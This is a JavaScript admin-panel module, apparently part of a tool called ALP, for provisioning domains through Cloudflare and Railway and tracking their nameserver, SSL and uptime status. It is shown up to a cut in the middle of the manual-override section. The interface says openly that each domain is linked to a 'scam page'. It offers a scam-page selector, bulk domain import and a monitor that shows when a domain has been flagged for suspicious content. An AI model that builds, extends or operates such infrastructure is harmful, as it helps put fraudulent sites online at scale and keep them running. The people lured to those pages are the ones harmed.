/**
 * ALP – Domain Management Page
 *
 * Two sections:
 *  1. Managed Domains  — domains provisioned through this panel (domains table)
 *     Full pipeline: pending_nameservers → nameservers_active → railway_linked → ssl_issued → live
 *  2. Website Domains  — domains configured in website settings (legacy Railway widget)
 */
const DomainsPage = (() => {

  // ─── state ──────────────────────────────────────────────────────────────────

  let _domains      = [];   // managed domains (domains table)
  let _websites     = [];   // legacy website list
  let _railwayDoms  = [];
  let _railwayCfg   = false;
  let _quota        = null;
  let _destroyed    = false;
  let _pollTimer    = null;
  let _detailId     = null; // which domain is open in detail modal
  let _scamPages    = [];   // all scam pages / websites for linking

  // ─── helpers ────────────────────────────────────────────────────────────────

  function esc(s) {
    return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
  }

  const PIPELINE_STEPS = [
    { key: 'pending_nameservers', label: 'Pending NS' },
    { key: 'nameservers_active',  label: 'NS Active'   },
    { key: 'railway_linked',      label: 'Railway Link' },
    { key: 'ssl_issued',          label: 'SSL Issued'  },
    { key: 'live',                label: 'Live'        },
  ];

  const STATUS_META = {
    pending_nameservers: { color: '#f59e0b', label: 'Pending Nameservers', icon: '⏳' },
    nameservers_active:  { color: '#a78bfa', label: 'Nameservers Active',  icon: '✓'  },
    railway_linked:      { color: '#60a5fa', label: 'Railway Linked',       icon: '🔗' },
    ssl_issued:          { color: '#34d399', label: 'SSL Issued',            icon: '🔒' },
    live:                { color: '#10b981', label: 'Live',                  icon: '✅' },
    error:               { color: '#f87171', label: 'Error',                 icon: '✕'  },
  };

  function stepIndex(status) {
    return PIPELINE_STEPS.findIndex(s => s.key === status);
  }

  function parseNs(d) { return Array.isArray(d.nameservers) ? d.nameservers : []; }
  function parseDns(d) { return Array.isArray(d.dns_records) ? d.dns_records : []; }

  function fmtTime(iso) {
    if (!iso) return '—';
    const d = new Date(iso);
    return d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  }

  function fmtAgo(iso) {
    if (!iso) return '—';
    const secs = Math.floor((Date.now() - new Date(iso)) / 1000);
    if (secs < 60)   return `${secs}s ago`;
    if (secs < 3600) return `${Math.floor(secs / 60)}m ago`;
    if (secs < 86400)return `${Math.floor(secs / 3600)}h ago`;
    return `${Math.floor(secs / 86400)}d ago`;
  }

  // ─── CSS ────────────────────────────────────────────────────────────────────

  function styles() {
    return `
<style>
/* ── Domain Management Page ───────────────────── */
.dm-pg { max-width: 1100px; margin: 0 auto; padding: 0 0 60px; }

/* Toolbar */
.dm-toolbar { display: flex; align-items: center; gap: 10px; margin-bottom: 18px; flex-wrap: wrap; }
.dm-title { font-size: 20px; font-weight: 800; color: var(--text-primary); flex: 1; }
.dm-btn {
  display: inline-flex; align-items: center; gap: 6px;
  padding: 8px 14px; border-radius: 9px; font-size: 12px; font-weight: 700;
  cursor: pointer; border: 1px solid; white-space: nowrap; transition: all .15s;
  font-family: 'Inter', sans-serif;
}
.dm-btn.primary   { background: rgba(99,102,241,.15); color: #a5b4fc; border-color: rgba(99,102,241,.3); }
.dm-btn.primary:hover { background: rgba(99,102,241,.25); }
.dm-btn.secondary { background: rgba(255,255,255,.05); color: var(--text-secondary); border-color: rgba(255,255,255,.1); }
.dm-btn.secondary:hover { background: rgba(255,255,255,.09); }
.dm-btn.danger    { background: rgba(239,68,68,.08); color: #f87171; border-color: rgba(239,68,68,.18); }
.dm-btn.danger:hover { background: rgba(239,68,68,.16); }
.dm-btn.success   { background: rgba(16,185,129,.1); color: #6ee7b7; border-color: rgba(16,185,129,.22); }
.dm-btn[disabled] { opacity: .35; cursor: not-allowed; pointer-events: none; }

/* CF status bar */
.dm-cf-bar {
  display: flex; align-items: center; gap: 14px;
  padding: 12px 18px; border-radius: 12px; margin-bottom: 18px;
  background: rgba(99,102,241,.05); border: 1px solid rgba(99,102,241,.18);
  font-size: 12px; flex-wrap: wrap;
}
.dm-cf-bar.warn { background: rgba(245,158,11,.04); border-color: rgba(245,158,11,.2); }
.dm-cf-quota { color: var(--text-secondary); }
.dm-cf-quota strong { color: #a5b4fc; }
.dm-cf-bar.warn .dm-cf-quota strong { color: #fbbf24; }

/* Section heading */
.dm-section-hdr {
  font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: .7px;
  color: var(--text-tertiary); margin: 28px 0 10px;
  display: flex; align-items: center; gap: 8px;
}
.dm-section-hdr::after { content: ''; flex: 1; height: 1px; background: rgba(255,255,255,.07); }

/* Table */
.dm-table-wrap { overflow-x: auto; border-radius: 14px; border: 1px solid rgba(255,255,255,.07); margin-bottom: 8px; }
.dm-table { width: 100%; border-collapse: collapse; font-size: 12.5px; }
.dm-table th {
  padding: 10px 14px; font-size: 10px; font-weight: 700; text-transform: uppercase;
  letter-spacing: .6px; color: var(--text-tertiary); text-align: left;
  background: rgba(255,255,255,.03); border-bottom: 1px solid rgba(255,255,255,.07);
  white-space: nowrap;
}
.dm-table td {
  padding: 12px 14px; border-bottom: 1px solid rgba(255,255,255,.04);
  color: var(--text-secondary); vertical-align: middle;
}
.dm-table tr:last-child td { border-bottom: none; }
.dm-table tr:hover td { background: rgba(255,255,255,.02); }

/* Domain name cell */
.dm-domain-name { font-family: monospace; font-size: 12.5px; color: #e2e8f0; font-weight: 600; }
.dm-domain-meta { font-size: 10.5px; color: var(--text-tertiary); margin-top: 2px; }
.dm-manual-tag {
  font-size: 9px; padding: 1px 5px; border-radius: 4px;
  background: rgba(245,158,11,.12); color: #fbbf24; border: 1px solid rgba(245,158,11,.2);
  font-weight: 700; vertical-align: middle; margin-left: 5px;
}

/* Pipeline bar */
.dm-pipeline { display: flex; align-items: center; gap: 2px; }
.dm-pipe-step {
  display: flex; align-items: center; gap: 2px;
  font-size: 9.5px; font-weight: 600; padding: 3px 7px; border-radius: 4px;
  white-space: nowrap; transition: all .2s;
}
.dm-pipe-step.done   { background: rgba(16,185,129,.12); color: #6ee7b7; }
.dm-pipe-step.active { background: rgba(99,102,241,.18); color: #a5b4fc; animation: dm-pulse 2s infinite; }
.dm-pipe-step.future { background: rgba(255,255,255,.04); color: #475569; }
.dm-pipe-step.error  { background: rgba(239,68,68,.12); color: #f87171; }
.dm-pipe-sep { color: #334155; font-size: 9px; }
@keyframes dm-pulse { 0%,100%{opacity:1} 50%{opacity:.55} }

/* Status badge */
.dm-status-badge {
  display: inline-flex; align-items: center; gap: 5px;
  padding: 3px 9px; border-radius: 20px; font-size: 11px; font-weight: 700;
}

/* Uptime dot */
.dm-uptime-dot {
  display: inline-flex; align-items: center; gap: 5px; font-size: 11px;
}
.dm-uptime-dot::before {
  content: ''; display: block; width: 7px; height: 7px; border-radius: 50%;
}
.dm-uptime-dot.up::before   { background: #10b981; box-shadow: 0 0 6px #10b981; }
.dm-uptime-dot.down::before { background: #ef4444; }
.dm-uptime-dot.unknown::before { background: #475569; }

/* Actions */
.dm-actions { display: flex; gap: 5px; flex-wrap: nowrap; }
.dm-act-btn {
  padding: 5px 9px; border-radius: 7px; font-size: 11px; font-weight: 600;
  cursor: pointer; border: 1px solid; white-space: nowrap; transition: all .15s;
  font-family: 'Inter', sans-serif; display: inline-flex; align-items: center; gap: 4px;
  text-decoration: none;
}
.dm-act-btn.view { background: rgba(99,102,241,.08); color: #a5b4fc; border-color: rgba(99,102,241,.2); }
.dm-act-btn.view:hover { background: rgba(99,102,241,.18); }
.dm-act-btn.check { background: rgba(16,185,129,.07); color: #6ee7b7; border-color: rgba(16,185,129,.18); }
.dm-act-btn.check:hover { background: rgba(16,185,129,.15); }
.dm-act-btn.del { background: rgba(239,68,68,.07); color: #f87171; border-color: rgba(239,68,68,.16); }
.dm-act-btn.del:hover { background: rgba(239,68,68,.15); }
.dm-act-btn.visit { background: rgba(16,185,129,.07); color: #6ee7b7; border-color: rgba(16,185,129,.18); }
.dm-act-btn.visit:hover { background: rgba(16,185,129,.15); }

/* Quick-link buttons inside modals */
.dm-quick-links { display: flex; gap: 8px; margin-bottom: 14px; flex-wrap: wrap; }
.dm-qlink {
  display: inline-flex; align-items: center; gap: 5px; padding: 7px 13px;
  border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer;
  border: 1px solid; text-decoration: none; transition: all .15s;
}
.dm-qlink.green { background: rgba(16,185,129,.1); color: #6ee7b7; border-color: rgba(16,185,129,.25); }
.dm-qlink.green:hover { background: rgba(16,185,129,.2); }
.dm-qlink.orange { background: rgba(245,158,11,.08); color: #fbbf24; border-color: rgba(245,158,11,.22); }
.dm-qlink.orange:hover { background: rgba(245,158,11,.16); }
.dm-qlink.blue { background: rgba(99,102,241,.1); color: #a5b4fc; border-color: rgba(99,102,241,.25); }
.dm-qlink.blue:hover { background: rgba(99,102,241,.2); }

/* Domain monitor section */
.dm-monitor-grid { display: flex; flex-direction: column; gap: 2px; }
.dm-mon-row {
  display: flex; align-items: center; gap: 12px; padding: 10px 14px;
  border-radius: 8px; background: rgba(255,255,255,.02);
  border: 1px solid rgba(255,255,255,.05); transition: background .15s;
}
.dm-mon-row:hover { background: rgba(255,255,255,.04); }
.dm-mon-domain { font-family: monospace; font-size: 12.5px; color: #e2e8f0; font-weight: 600; flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.dm-mon-status { font-size: 11px; font-weight: 700; white-space: nowrap; min-width: 110px; }
.dm-mon-flag { font-size: 11px; min-width: 80px; }
.dm-mon-uptime { font-size: 11px; min-width: 55px; }
.dm-mon-time { font-size: 10.5px; color: var(--text-tertiary); min-width: 70px; text-align: right; }
.dm-flag-clean { color: #6ee7b7; }
.dm-flag-alert { color: #f87171; font-weight: 700; }
.dm-flag-none  { color: #475569; }

/* Empty state */
.dm-empty { text-align: center; padding: 52px 20px; color: var(--text-tertiary); font-size: 13px; }
.dm-empty-icon { font-size: 36px; margin-bottom: 12px; opacity: .4; }
.dm-empty p { max-width: 300px; margin: 0 auto; line-height: 1.6; }

/* Nameserver copy box */
.dm-ns-box {
  background: rgba(0,0,0,.25); border: 1px solid rgba(255,255,255,.1);
  border-radius: 10px; padding: 12px 14px; margin: 10px 0;
}
.dm-ns-row {
  display: flex; align-items: center; gap: 8px; padding: 5px 0;
  border-bottom: 1px solid rgba(255,255,255,.05);
}
.dm-ns-row:last-child { border-bottom: none; }
.dm-ns-val { font-family: monospace; font-size: 12.5px; color: #e2e8f0; flex: 1; }
.dm-copy-btn {
  padding: 3px 9px; border-radius: 6px; font-size: 10.5px; font-weight: 700;
  background: rgba(99,102,241,.12); color: #a5b4fc; border: 1px solid rgba(99,102,241,.22);
  cursor: pointer; transition: all .15s;
}
.dm-copy-btn:hover { background: rgba(99,102,241,.22); }
.dm-copy-btn.copied { background: rgba(16,185,129,.12); color: #6ee7b7; border-color: rgba(16,185,129,.22); }

/* Detail modal sections */
.dm-detail-section {
  background: rgba(255,255,255,.03); border: 1px solid rgba(255,255,255,.07);
  border-radius: 10px; padding: 14px 16px; margin-bottom: 12px;
}
.dm-detail-lbl {
  font-size: 9.5px; font-weight: 700; text-transform: uppercase; letter-spacing: .6px;
  color: var(--text-tertiary); margin-bottom: 10px;
}
.dm-kv { display: flex; justify-content: space-between; align-items: flex-start; gap: 12px; padding: 4px 0; font-size: 12px; }
.dm-kv-k { color: var(--text-tertiary); flex-shrink: 0; }
.dm-kv-v { color: #e2e8f0; text-align: right; word-break: break-all; font-family: monospace; font-size: 11.5px; }

/* Audit log */
.dm-audit-row {
  padding: 7px 0; border-bottom: 1px solid rgba(255,255,255,.04); font-size: 11.5px;
  display: flex; align-items: flex-start; gap: 10px;
}
.dm-audit-row:last-child { border-bottom: none; }
.dm-audit-time { color: var(--text-tertiary); white-space: nowrap; flex-shrink: 0; font-size: 10.5px; }
.dm-audit-action { color: #a5b4fc; font-weight: 600; }
.dm-audit-error { color: #f87171; font-size: 10.5px; margin-top: 2px; }

/* Override select */
.dm-override-row { display: flex; gap: 8px; margin-top: 10px; }
.dm-override-sel {
  flex: 1; padding: 8px 10px; background: rgba(255,255,255,.05);
  border: 1px solid rgba(255,255,255,.1); border-radius: 8px;
  color: #f1f5f9; font-size: 12px; font-family: 'Inter', sans-serif;
}
</style>`;
  }

  // ─── page skeleton ────────────────────────────────────────────────────────

  function render() {
    return `${styles()}
<div class="dm-pg">

  <!-- toolbar -->
  <div class="dm-toolbar">
    <span class="dm-title">Domain Management</span>
    <button class="dm-btn secondary" id="dm-import-btn">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="16 16 12 12 8 16"/><line x1="12" y1="12" x2="12" y2="21"/><path d="M20.39 18.39A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.3"/></svg>
      Bulk Import
    </button>
    <button class="dm-btn secondary" id="dm-refresh-btn">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 102.13-9.36L1 10"/></svg>
      Refresh
    </button>
    <button class="dm-btn primary" id="dm-connect-btn">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
      Connect Domain
    </button>
  </div>

  <!-- CF status bar -->
  <div id="dm-cf-bar" style="display:none;"></div>

  <!-- managed domains section -->
  <div class="dm-section-hdr">
    <span>Managed Domains</span>
  </div>
  <div class="dm-table-wrap card">
    <table class="dm-table">
      <thead>
        <tr>
          <th>Domain</th>
          <th>Pipeline</th>
          <th>Uptime</th>
          <th>Last checked</th>
          <th>Actions</th>
        </tr>
      </thead>
      <tbody id="dm-tbody">
        <tr><td colspan="5" class="dm-empty"><div class="dm-empty-icon">🌐</div><p>Loading managed domains…</p></td></tr>
      </tbody>
    </table>
  </div>
  <div id="dm-error-msg" style="font-size:11.5px;color:#f87171;margin:4px 14px;display:none;"></div>

  <!-- domain monitor section -->
  <div class="dm-section-hdr" style="margin-top:36px;">
    <span>Domain Monitor</span>
    <button class="dm-btn secondary" id="dm-checkall-btn" style="margin-left:auto;">
      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
      Check All Now
    </button>
  </div>
  <div id="dm-monitor-wrap">
    <div class="dm-empty" style="padding:20px;"><p>Loading monitor…</p></div>
  </div>

  <!-- legacy website domains section -->
  <div class="dm-section-hdr" style="margin-top:36px;">
    <span>Website Domains (from Settings)</span>
  </div>
  <div id="dm-legacy-wrap"></div>

</div>`;
  }

  // ─── CF quota bar ─────────────────────────────────────────────────────────

  function renderQuotaBar() {
    const bar = document.getElementById('dm-cf-bar');
    if (!bar) return;
    if (!_quota) { bar.style.display = 'none'; return; }
    const { configured, count, limit } = _quota;
    if (!configured) {
      bar.className = 'dm-cf-bar warn';
      bar.style.display = 'flex';
      bar.innerHTML = `<span style="color:#fbbf24;">⚠</span>
        <span class="dm-cf-quota"><strong>CLOUDFLARE_API_TOKEN</strong> not set — domain provisioning disabled</span>`;
      return;
    }
    bar.className = 'dm-cf-bar';
    bar.style.display = 'flex';
    const countStr = count !== null ? `<strong>${count}</strong>` : '<strong>?</strong>';
    const limitStr = limit !== null ? ` / ${limit}` : '';
    bar.innerHTML = `<span style="color:#34d399;">✓</span>
      <span class="dm-cf-quota">Cloudflare connected · Zones: ${countStr}${limitStr}</span>`;
  }

  // ─── Managed domains table ────────────────────────────────────────────────

  function renderTable() {
    const tbody = document.getElementById('dm-tbody');
    if (!tbody) return;

    if (!_domains.length) {
      tbody.innerHTML = `<tr><td colspan="5" class="dm-empty">
        <div class="dm-empty-icon">🌐</div>
        <p>No managed domains yet.<br>Click <strong>Connect Domain</strong> to get started.</p>
      </td></tr>`;
      return;
    }

    tbody.innerHTML = _domains.map(d => {
      const meta  = STATUS_META[d.status] || STATUS_META.error;
      const badge = `<span class="dm-status-badge" style="background:${meta.color}1a;color:${meta.color};border:1px solid ${meta.color}33;">${meta.icon} ${meta.label}</span>`;

      const pipeline = renderPipeline(d);

      let uptime = `<span class="dm-uptime-dot unknown">—</span>`;
      if (d.uptime_ok === 1) uptime = `<span class="dm-uptime-dot up">Up</span>`;
      if (d.uptime_ok === 0) uptime = `<span class="dm-uptime-dot down">Down</span>`;

      const manual = d.manual_override ? `<span class="dm-manual-tag">MANUAL</span>` : '';

      const isLive = d.status === 'live' || d.status === 'ssl_issued';
      const visitBtn = isLive
        ? `<a class="dm-act-btn visit" href="https://${esc(d.domain)}" target="_blank" rel="noopener" title="Open domain in browser">↗</a>`
        : '';
      const flagDot = d.flagged
        ? `<span title="Flagged: ${esc(d.flag_reason || 'suspicious content detected')}" style="color:#f87171;font-size:13px;">⚠</span>`
        : '';

      return `<tr>
        <td>
          <div class="dm-domain-name">${esc(d.domain)}${manual}${flagDot}</div>
          ${d.error_message && d.status === 'error' ? `<div class="dm-domain-meta" style="color:#f87171;">${esc(d.error_message.slice(0, 80))}${d.error_message.length > 80 ? '…' : ''}</div>` : ''}
          ${d.status === 'pending_nameservers' ? `<div class="dm-domain-meta">Update nameservers at your registrar</div>` : ''}
        </td>
        <td>${pipeline}</td>
        <td>${uptime}</td>
        <td style="font-size:11px;color:var(--text-tertiary);">${fmtAgo(d.last_checked_at)}</td>
        <td>
          <div class="dm-actions">
            ${visitBtn}
            <button class="dm-act-btn view" data-id="${d.id}" title="View details">Details</button>
            <button class="dm-act-btn check" data-id="${d.id}" data-action="recheck" title="Force recheck now">↻</button>
            <button class="dm-act-btn del" data-id="${d.id}" data-action="delete" title="Delete &amp; cleanup">✕</button>
          </div>
        </td>
      </tr>`;
    }).join('');

    // wire buttons
    tbody.querySelectorAll('.dm-act-btn.view').forEach(btn => {
      btn.addEventListener('click', () => openDetail(btn.dataset.id));
    });
    tbody.querySelectorAll('[data-action="recheck"]').forEach(btn => {
      btn.addEventListener('click', () => recheckDomain(btn.dataset.id, btn));
    });
    tbody.querySelectorAll('[data-action="delete"]').forEach(btn => {
      btn.addEventListener('click', () => confirmDelete(btn.dataset.id));
    });
  }

  function renderPipeline(d) {
    if (d.status === 'error') {
      return `<div class="dm-pipeline">
        <span class="dm-pipe-step error">✕ ${esc(d.error_message ? d.error_message.slice(0, 40) + (d.error_message.length > 40 ? '…' : '') : 'Error')}</span>
      </div>`;
    }
    const cur = stepIndex(d.status);
    return `<div class="dm-pipeline">
      ${PIPELINE_STEPS.map((s, i) => {
        const cls = i < cur ? 'done' : i === cur ? 'active' : 'future';
        const sep = i < PIPELINE_STEPS.length - 1 ? '<span class="dm-pipe-sep">›</span>' : '';
        return `<span class="dm-pipe-step ${cls}">${esc(s.label)}</span>${sep}`;
      }).join('')}
    </div>`;
  }

  // ─── Legacy website domains table ─────────────────────────────────────────

  function renderLegacy() {
    const wrap = document.getElementById('dm-legacy-wrap');
    if (!wrap) return;

    const rows = [];
    for (const w of _websites) {
      if (w.domain && w.domain !== 'localhost' && !w.domain.startsWith('auto-')) {
        rows.push({ site: w.name, color: w.color || '#6366f1', domain: w.domain.toLowerCase(), active: w.domain_active !== 0, isPrimary: true });
      }
      const alt = Array.isArray(w.domain_alt) ? w.domain_alt : (w.domain_alt ? tryParseArr(w.domain_alt) : []);
      alt.forEach(a => {
        const d = (a.domain || '').trim().toLowerCase();
        if (d) rows.push({ site: w.name, color: w.color || '#6366f1', domain: d, active: !!a.active, isPrimary: false });
      });
    }

    if (!rows.length) {
      wrap.innerHTML = `<div class="dm-empty" style="padding:28px 20px;"><p>No website domains configured.</p></div>`;
      return;
    }

    wrap.innerHTML = `
    <div class="dm-table-wrap card">
      <table class="dm-table">
        <thead><tr><th>Website</th><th>Domain</th><th>Status</th><th>Railway</th><th></th></tr></thead>
        <tbody>
          ${rows.map(r => {
            const rd = _railwayDoms.find(x => x.domain === r.domain || x.domain === `www.${r.domain}`);
            const dnsOk = rd
              ? (rd.syncStatus === 'ACTIVE' ||
                 (rd.status?.dnsRecords || []).every(x =>
                   x.status === 'DNS_RECORD_STATUS_PROPAGATED' || x.status === 'VALID'))
              : false;
            const ryBadge = !_railwayCfg
              ? `<span style="font-size:11px;color:var(--text-tertiary);">—</span>`
              : rd
                ? dnsOk
                  ? `<span style="font-size:11px;color:#6ee7b7;">✓ DNS OK</span>`
                  : `<span style="font-size:11px;color:#fbbf24;">⏳ Pending</span>`
                : `<span style="font-size:11px;color:#475569;">—</span>`;
            const delBtn = rd
              ? `<button class="dm-btn" style="background:rgba(239,68,68,.12);color:#f87171;border-color:rgba(239,68,68,.25);font-size:11px;padding:4px 10px;"
                   onclick="DomainsPage._deleteLegacyRailway('${esc(rd.id)}','${esc(r.domain)}')">
                   Remove from Railway
                 </button>`
              : '';
            return `<tr>
              <td><span style="display:inline-flex;align-items:center;gap:7px;">
                <span style="width:8px;height:8px;border-radius:50%;background:${esc(r.color)};flex-shrink:0;"></span>
                <span style="font-size:12px;font-weight:600;color:var(--text-primary);">${esc(r.site)}</span>
              </span></td>
              <td>
                <span class="dm-domain-name">${esc(r.domain)}</span>
                ${r.isPrimary ? '<span style="font-size:8.5px;padding:1px 6px;background:rgba(99,102,241,.15);color:#818cf8;border-radius:20px;margin-left:5px;font-weight:700;">PRIMARY</span>' : ''}
              </td>
              <td><span style="display:inline-flex;align-items:center;gap:5px;font-size:11px;color:${r.active ? '#6ee7b7' : '#94a3b8'};">
                <span style="width:6px;height:6px;border-radius:50%;background:${r.active ? '#10b981' : '#475569'};"></span>
                ${r.active ? 'Active' : 'Inactive'}
              </span></td>
              <td>${ryBadge}</td>
              <td style="text-align:right;">${delBtn}</td>
            </tr>`;
          }).join('')}
        </tbody>
      </table>
    </div>`;
  }

  function tryParseArr(raw) {
    try { const p = JSON.parse(raw); return Array.isArray(p) ? p : []; } catch { return []; }
  }

  // ─── Connect Domain modal ─────────────────────────────────────────────────

  function openConnectModal() {
    const pageOptions = _scamPages.length
      ? _scamPages.map(w => `<option value="${esc(w.id)}">${esc(w.name)}${w.demo_slug ? ' — /' + esc(w.demo_slug) : ''}</option>`).join('')
      : '<option value="" disabled>No scam pages found</option>';

    const content = `
<div style="background:rgba(251,191,36,.07);border:1px solid rgba(251,191,36,.2);border-radius:10px;padding:12px 14px;margin-bottom:14px;">
  <div style="font-size:11px;font-weight:700;color:#fbbf24;letter-spacing:.06em;margin-bottom:8px;">HOW IT WORKS</div>
  <div style="font-size:12px;color:#cbd5e1;line-height:1.8;">
    <span style="color:#fbbf24;font-weight:600;">1.</span> Enter your domain and pick which scam page it opens<br>
    <span style="color:#fbbf24;font-weight:600;">2.</span> Click <strong>Create Zone</strong> — copy the nameservers shown and update them at your registrar<br>
    <span style="color:#fbbf24;font-weight:600;">3.</span> Done — Railway + SSL happen automatically. Once live, the domain serves the selected page.
  </div>
</div>
<label style="display:block;font-size:11px;font-weight:600;color:#94a3b8;letter-spacing:.05em;margin-bottom:6px;">DOMAIN NAME</label>
<input type="text" id="dm-new-domain" placeholder="example.com"
  style="width:100%;padding:10px 12px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);
  border-radius:9px;color:#f1f5f9;font-size:13px;font-family:monospace;box-sizing:border-box;margin-bottom:12px;"
  autocomplete="off" spellcheck="false"/>
<div style="font-size:11px;color:#64748b;margin-bottom:12px;">Enter the root domain only — no www, no https://</div>
<label style="display:block;font-size:11px;font-weight:600;color:#94a3b8;letter-spacing:.05em;margin-bottom:6px;">LINK TO SCAM PAGE <span style="font-weight:400;color:#64748b;">(opens when domain is live)</span></label>
<select id="dm-new-website" style="width:100%;padding:10px 12px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:9px;color:#f1f5f9;font-size:13px;box-sizing:border-box;">
  <option value="">— none (link later) —</option>
  ${pageOptions}
</select>
<div id="dm-ns-result" style="display:none;margin-top:14px;"></div>`;

    let zoneCreated = false;

    window.showModal({
      title: '🌐 Connect a Domain',
      content,
      confirmText: 'Create Zone',
      cancelText: 'Cancel',
      width: '520px',
      closeOnBackdrop: false,
      onConfirm: async () => {
        if (zoneCreated) return; // "Done" click — modal closes normally

        const input     = document.getElementById('dm-new-domain');
        const wSel      = document.getElementById('dm-new-website');
        const domain    = (input?.value || '').trim().toLowerCase().replace(/^https?:\/\//, '').replace(/^www\./, '').split('/')[0];
        const websiteId = wSel?.value ? Number(wSel.value) : null;
        if (!domain || !domain.includes('.')) {
          window.showToast('Enter a valid domain name (e.g. example.com)', 'error');
          throw new Error('keep-modal');
        }
        try {
          const result = await window.ALPApi.addDomain(domain, websiteId);
          if (result.resumed) {
            window.showToast(`${domain} already exists — resuming from ${result.domain.status}`, 'info');
          } else {
            window.showToast(`Zone created for ${domain}`, 'success');
          }

          const nsBox = document.getElementById('dm-ns-result');
          const ns = Array.isArray(result.domain.nameservers) ? result.domain.nameservers : [];
          if (nsBox && ns.length) {
            nsBox.style.display = 'block';
            nsBox.innerHTML = `
<div style="background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.25);border-radius:8px;padding:10px 12px;margin-bottom:10px;">
  <div style="font-size:11px;font-weight:700;color:#f87171;letter-spacing:.06em;margin-bottom:4px;">ACTION REQUIRED</div>
  <div style="font-size:12px;color:#fca5a5;line-height:1.6;">Go to your registrar → Domain → Nameservers → select <strong>Custom DNS</strong> and set these:</div>
</div>
${nsBox_html(ns)}
<div style="font-size:11px;color:#64748b;margin-top:8px;line-height:1.6;">
  After updating, click <strong style="color:#f1f5f9;">Done</strong> to close. The pipeline advances automatically — check back in 30–60 minutes.
</div>`;
            wireNsCopy(nsBox);
          }

          await loadManaged();
          renderTable();

          // Change button to "Done" and keep modal open so user can copy nameservers
          zoneCreated = true;
          const confirmBtn = document.querySelector('.alp-mc');
          if (confirmBtn) {
            confirmBtn.textContent = 'Done';
            confirmBtn.disabled = false;
            confirmBtn.style.opacity = '1';
            confirmBtn.style.cursor = 'pointer';
          }
          throw new Error('keep-modal');
        } catch (err) {
          if (err.message === 'keep-modal') throw err;
          window.showToast(err.message, 'error');
          throw err;
        }
      },
    });

    setTimeout(() => {
      document.getElementById('dm-new-domain')?.focus();
    }, 80);
  }

  function nsBox_html(nameservers) {
    return `<div class="dm-ns-box">${nameservers.map(ns =>
      `<div class="dm-ns-row">
        <span class="dm-ns-val">${esc(ns)}</span>
        <button class="dm-copy-btn" data-ns="${esc(ns)}">Copy</button>
      </div>`
    ).join('')}</div>`;
  }

  function wireNsCopy(container) {
    if (!container) return;
    container.querySelectorAll('.dm-copy-btn').forEach(btn => {
      btn.addEventListener('click', async () => {
        const text = btn.dataset.ns;
        try {
          await navigator.clipboard.writeText(text);
          btn.textContent = 'Copied!';
          btn.className = 'dm-copy-btn copied';
          setTimeout(() => { btn.textContent = 'Copy'; btn.className = 'dm-copy-btn'; }, 2000);
        } catch {
          // Clipboard API blocked — fallback to execCommand
          const el = document.createElement('textarea');
          el.value = text;
          el.style.cssText = 'position:fixed;opacity:0;pointer-events:none;';
          document.body.appendChild(el);
          el.select();
          document.execCommand('copy');
          document.body.removeChild(el);
          btn.textContent = 'Copied!';
          btn.className = 'dm-copy-btn copied';
          setTimeout(() => { btn.textContent = 'Copy'; btn.className = 'dm-copy-btn'; }, 2000);
        }
      });
    });
  }

  // ─── Detail modal ─────────────────────────────────────────────────────────

  async function openDetail(id) {
    _detailId = id;
    const domain = _domains.find(d => String(d.id) === String(id));
    if (!domain) return;

    let logsHtml = '<div style="color:var(--text-tertiary);font-size:12px;">Loading…</div>';
    const meta   = STATUS_META[domain.status] || STATUS_META.error;
    const ns     = parseNs(domain);
    const dns    = parseDns(domain);

    const nsSection = ns.length ? `
<div class="dm-detail-section">
  <div class="dm-detail-lbl">Nameservers (set at your registrar)</div>
  ${nsBox_html(ns)}
</div>` : '';

    const dnsSection = dns.length ? `
<div class="dm-detail-section">
  <div class="dm-detail-lbl">DNS Records created in Cloudflare</div>
  ${dns.map(r => `
  <div class="dm-kv">
    <span class="dm-kv-k">${esc(r.type)} ${esc(r.name)}</span>
    <span class="dm-kv-v">${esc(r.content)}</span>
  </div>`).join('')}
</div>` : '';

    const linkedPage   = _scamPages.find(w => String(w.id) === String(domain.website_id));
    const spOptions    = _scamPages.map(w =>
      `<option value="${esc(w.id)}" ${String(w.id) === String(domain.website_id) ? 'selected' : ''}>${esc(w.name)}${w.demo_slug ? ' — /' + esc(w.demo_slug) : ''}</option>`
    ).join('');

    const scamPageSection = `
<div class="dm-detail-section">
  <div class="dm-detail-lbl">Linked Scam Page</div>
  ${linkedPage
    ? `<div class="dm-kv" style="margin-bottom:10px;">
        <span class="dm-kv-k">Currently linked</span>
        <span class="dm-kv-v" style="color:#10b981;font-weight:600;">✓ ${esc(linkedPage.name)}${linkedPage.demo_slug ? ' <span style="color:#64748b;font-weight:400;">(/'+esc(linkedPage.demo_slug)+')</span>' : ''}</span>
       </div>`
    : `<div style="font-size:12px;color:#f59e0b;margin-bottom:10px;">⚠ No scam page linked — domain will show a 404 when live.</div>`}
  <div style="display:flex;gap:8px;">
    <select id="dm-website-sel" style="flex:1;padding:7px 10px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:8px;color:#f1f5f9;font-size:12px;">
      <option value="">— none —</option>
      ${spOptions}
    </select>
    <button class="dm-btn secondary" id="dm-save-website-btn" style="padding:7px 12px;white-space:nowrap;">Save</button>
  </div>
</div>`;

    const overrideSection = `
<div class="dm-detail-section">
  <div class="dm-detail-lbl">Manual Override</div>
  <div style="font-size:11.5px;color:var(--text-secondary);margin-bottom:10px;">
    Force-advance the pipeline to a specific stage (use when automating isn't possible).
  </div>

